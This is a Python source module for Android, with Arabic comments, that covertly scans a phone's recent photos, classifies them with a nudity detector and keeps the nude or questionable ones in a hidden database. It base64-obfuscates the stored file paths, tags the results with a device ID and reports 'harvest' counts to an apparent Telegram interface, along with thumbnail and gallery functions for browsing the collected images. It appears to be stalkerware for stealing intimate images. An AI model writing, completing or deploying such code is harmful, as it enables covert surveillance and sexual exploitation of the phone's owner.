# -*- coding: utf-8 -*-
import os
import time
import threading
import hashlib
import sqlite3
import logging
import gc
import base64
import random
from datetime import datetime

# ========== إعداد المسارات الموحدة ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
DB = os.path.join(P, "m_arch.db")
if not os.path.exists(P):
    os.makedirs(P)

logging.basicConfig(filename=os.path.join(P, "s.log"), level=logging.ERROR, filemode='a')

try:
    from jnius import autoclass
    JNI = True
except ImportError:
    JNI = False

# ========== إزالة cryptography بالكامل - استخدام base64 فقط ==========


class MediaScanner:
    def __init__(self, det=None, ui=None):
        self.det = det          # NudeDetector instance
        self.ui = ui            # TelegramUI instance
        self.active = False
        self.did = "Unknown"
        self._init_db()

        # جلب معرف الجهاز من الواجهة (إن وجد)
        try:
            if self.ui and hasattr(self.ui, 'm') and hasattr(self.ui.m, 'did'):
                self.did = self.ui.m.did
        except:
            pass

    # ========== نظام تشفير بسيط (base64 فقط - لا تبعيات خارجية) ==========
    def _enc(self, text: str) -> str:
        """تشفير بسيط باستخدام base64 (لإخفاء المسار فقط، ليس أماناً حقيقياً)"""
        try:
            return base64.urlsafe_b64encode(text.encode()).decode()
        except:
            return text

    def _dec(self, enc_text: str) -> str:
        """فك تشفير base64"""
        try:
            return base64.urlsafe_b64decode(enc_text.encode()).decode()
        except:
            return enc_text

    # ========== إدارة قاعدة البيانات ==========
    def _init_db(self):
        try:
            with sqlite3.connect(DB) as conn:
                conn.execute('''CREATE TABLE IF NOT EXISTS media (
                    h TEXT PRIMARY KEY,
                    p TEXT,
                    ts INTEGER,
                    cat TEXT DEFAULT 'pending',
                    score REAL DEFAULT 0)''')
                conn.execute('CREATE INDEX IF NOT EXISTS idx_cat ON media(cat)')
                conn.commit()
        except Exception as e:
            logging.error(f"DB Init error: {e}")

    def _partial_hash(self, path: str) -> str:
        try:
            st = os.stat(path)
            base = f"{st.st_size}_{int(st.st_mtime)}"
            with open(path, "rb") as f:
                head = f.read(2048)
            return hashlib.md5(head + base.encode()).hexdigest()
        except:
            return None

    def _safe_path(self, path: str) -> bool:
        bad = ["/Android/", "/obb/", "/data/", "/."]
        return not any(x in path for x in bad) and not os.path.basename(path).startswith(".")

    # ========== مسح سريع لآخر 48 ساعة ==========
    def _fast_scan(self, limit=100):
        if not JNI:
            return []
        cursor = None
        results = []
        try:
            act = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = act.getContentResolver()
            MediaStore = autoclass('android.provider.MediaStore')

            time_threshold = int(time.time()) - (48 * 3600)
            img_uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            projection = ["_data", "date_added"]
            selection = "date_added > ?"
            args = [str(time_threshold)]
            order = "date_added DESC LIMIT " + str(limit)

            cursor = resolver.query(img_uri, projection, selection, args, order)
            if cursor:
                while cursor.moveToNext():
                    p = cursor.getString(0)
                    if p and os.path.exists(p) and self._safe_path(p):
                        results.append(p)
            return results
        except Exception as e:
            logging.error(f"Scan error: {e}")
            return []
        finally:
            if cursor:
                cursor.close()
            gc.collect()

    # ========== معالجة الملفات الجديدة ==========
    def _process_files(self, paths):
        if self.active or not paths:
            return
        self.active = True
        sensitive_count = 0

        try:
            now = int(time.time())
            with sqlite3.connect(DB) as conn:
                for p in paths:
                    h = self._partial_hash(p)
                    if not h:
                        continue

                    # تجنب التكرار
                    cur = conn.execute("SELECT 1 FROM media WHERE h=?", (h,))
                    if cur.fetchone():
                        continue

                    cat = 'pending'
                    score = 0.0
                    if self.det and hasattr(self.det, 'analyze'):
                        prob = self.det.analyze(p)
                        if prob > 0.85:
                            cat = 'nude'
                            score = prob
                            sensitive_count += 1
                        elif prob > 0.45:
                            cat = 'questionable'
                            score = prob
                            sensitive_count += 1
                        else:
                            # صورة عادية لا ندرجها
                            continue
                    else:
                        # إذا لم يوجد كاشف، نخزنها معلقة للتحليل لاحقاً
                        cat = 'pending'

                    conn.execute(
                        "INSERT INTO media (h, p, ts, cat, score) VALUES (?, ?, ?, ?, ?)",
                        (h, self._enc(p), now, cat, score)
                    )
                conn.commit()

            # إشعار بالصور الحساسة المكتشفة
            if sensitive_count > 0 and self.ui and hasattr(self.ui, 'notify_harvest'):
                try:
                    self.ui.notify_harvest(self.did, sensitive_count)
                except Exception as e:
                    logging.error(f"Notify error: {e}")

        except Exception as e:
            logging.error(f"Process error: {e}")
        finally:
            self.active = False
            gc.collect()

    # ========== توليد صورة مصغرة ==========
    def get_thumbnail(self, path):
        if not JNI or not os.path.exists(path):
            return None
        cursor = None
        try:
            # تنظيف المصغرات القديمة (أكثر من 10 دقائق)
            now = time.time()
            for f in os.listdir(P):
                if f.startswith("th_") and os.path.getmtime(os.path.join(P, f)) < now - 600:
                    try:
                        os.remove(os.path.join(P, f))
                    except:
                        pass

            MediaStore = autoclass('android.provider.MediaStore')
            BitmapFactory = autoclass('android.graphics.BitmapFactory')
            CompressFormat = autoclass('android.graphics.Bitmap$CompressFormat')
            FileOutputStream = autoclass('java.io.FileOutputStream')
            resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()

            uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            sel = MediaStore.Images.Media.DATA + "=?"
            cursor = resolver.query(uri, ["_id"], sel, [path], None)

            if cursor and cursor.moveToFirst():
                img_id = cursor.getLong(0)
                options = BitmapFactory.Options()
                options.inSampleSize = 2
                bitmap = MediaStore.Images.Thumbnails.getThumbnail(
                    resolver, img_id,
                    MediaStore.Images.Thumbnails.MINI_KIND,
                    options
                )
                if bitmap:
                    out_path = os.path.join(P, f"th_{int(time.time())}_{random.randint(0, 99)}.jpg")
                    with FileOutputStream(out_path) as out:
                        bitmap.compress(CompressFormat.JPEG, 70, out)
                        out.flush()
                    bitmap.recycle()
                    return out_path
        except Exception as e:
            logging.error(f"Thumb error: {e}")
        finally:
            if cursor:
                cursor.close()
            gc.collect()
        return None

    # ========== جلب المعرض حسب التصنيف ==========
    def get_gallery_by_category(self, category, limit=16, page=0):
        offset = page * limit
        results = []
        try:
            with sqlite3.connect(DB) as conn:
                cur = conn.execute(
                    "SELECT h, p, cat, score FROM media WHERE cat=? ORDER BY ts DESC LIMIT ? OFFSET ?",
                    (category, limit, offset)
                )
                rows = cur.fetchall()
                for i, row in enumerate(rows):
                    path = self._dec(row[1])
                    if os.path.exists(path):
                        results.append({
                            "hash": row[0],
                            "path": path,
                            "cat": row[2],
                            "score": row[3],
                            "label": str(offset + i + 1).zfill(2)
                        })
                    else:
                        conn.execute("DELETE FROM media WHERE h=?", (row[0],))
                conn.commit()
        except Exception as e:
            logging.error(f"Gallery error: {e}")
        return results

    # ========== تحديث فئة ملف (يُستدعى من الـ AI) ==========
    def update_category(self, file_hash, category, score=0):
        try:
            with sqlite3.connect(DB) as conn:
                conn.execute("UPDATE media SET cat=?, score=? WHERE h=?", (category, score, file_hash))
                conn.commit()
        except:
            pass

    # ========== إحصائيات ==========
    def get_statistics(self):
        stats = {'nude': 0, 'questionable': 0, 'normal': 0, 'pending': 0}
        try:
            with sqlite3.connect(DB) as conn:
                cur = conn.execute("SELECT cat, COUNT(*) FROM media GROUP BY cat")
                for row in cur.fetchall():
                    if row[0] in stats:
                        stats[row[0]] = row[1]
        except Exception as e:
            logging.error(f"Statistics error: {e}")
        return stats

    # ========== تنظيف قاعدة البيانات (للمساحة) ==========
    def _cleanup_db(self):
        try:
            with sqlite3.connect(DB) as conn:
                cur = conn.execute("SELECT h, p FROM media")
                to_del = []
                for h, p_enc in cur.fetchall():
                    if not os.path.exists(self._dec(p_enc)):
                        to_del.append((h,))
                if to_del:
                    conn.executemany("DELETE FROM media WHERE h=?", to_del)
                # حذف أقدم من 5000 صورة (احتياط)
                conn.execute("DELETE FROM media WHERE h NOT IN (SELECT h FROM media ORDER BY ts DESC LIMIT 5000)")
                conn.execute("VACUUM")
                conn.commit()
        except:
            pass
        finally:
            gc.collect()

    # ========== تشغيل المسح ==========
    def run_scan(self):
        def _task():
            files = self._fast_scan(limit=100)
            if files:
                self._process_files(files)
        threading.Thread(target=_task, daemon=True).start()


def create(det=None, ui=None):
    return MediaScanner(det, ui)
